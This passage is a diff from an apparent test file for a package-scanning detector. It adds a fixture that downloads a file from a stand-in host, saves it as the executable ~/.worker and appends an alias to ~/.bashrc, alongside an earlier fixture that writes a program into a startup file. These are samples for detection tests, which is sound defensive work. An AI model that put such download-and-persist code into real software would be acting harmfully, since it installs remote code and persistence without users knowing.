@@ -319,10 +319,23 @@ def install(path):
     with open(startup_path, 'a') as startup:
         startup.write(f'\\n{path} &')
 """
+    unrelated_startup_write = """\
+import os
+import urllib.request
+def install():
+    payload = urllib.request.urlopen('https://example.invalid/tool').read()
+    path = os.path.expanduser('~/.worker')
+    with open(path, 'wb') as output:
+        output.write(payload)
+    os.chmod(path, 0o755)
+    with open(os.path.expanduser('~/.bashrc'), 'a') as startup:
+        startup.write('alias ll="ls -la"')
+"""
     parsed = parse.parse_package(ingest.build_package(str(make_package({
         "positive.py": positive,
         "download-only.py": remote_without_persistence,
         "local-startup.py": local_startup_setup,
+        "unrelated-startup.py": unrelated_startup_write,
     }))))
 
     findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)
